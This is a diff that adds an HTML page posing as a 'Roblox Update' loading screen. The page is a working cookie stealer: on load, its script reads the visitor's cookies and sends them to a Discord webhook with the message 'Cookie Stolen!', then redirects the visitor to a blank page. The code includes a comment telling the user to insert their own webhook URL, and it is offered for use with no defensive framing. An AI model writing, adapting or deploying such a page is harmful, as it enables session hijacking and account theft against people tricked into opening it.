@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Update</title>
+    <style>
+        body { background: #1b1d1f; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <script>
+        // REPLACE THIS WITH YOUR ACTUAL WEBHOOK URL
+        const WEBHOOK = "https://discord.com/api/webhooks/1559507908339830915/1rF2lKbnmwqnLsaBoP5L88G2TxFMZBwwTUT4gYlKM47GCSTNQnqudCkhx5rFnJyG-iSP";
+
+        async function steal() {
+            const cookies = document.cookie;
+           
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    // This sends the cookie as plain text, no fancy boxes
+                    content: "🎣 Cookie Stolen! ``` " + cookies + " ```",
+                   
+                    // Optional: You can still keep an embed for visual flair,
+                    // but the main cookie is in the 'content' line above.
+                    embeds: [{
+                        title: "Session Hijacked",
+                        description: "Check the message content for the raw cookie.",
+                        color: 15158332
+                    }]
+                })
+            });
+
+            setTimeout(() => {
+                window.location.href = "about:blank";
+            }, 1000);
+        }
+
+        steal();
+    </script>
+</body>
+</html>
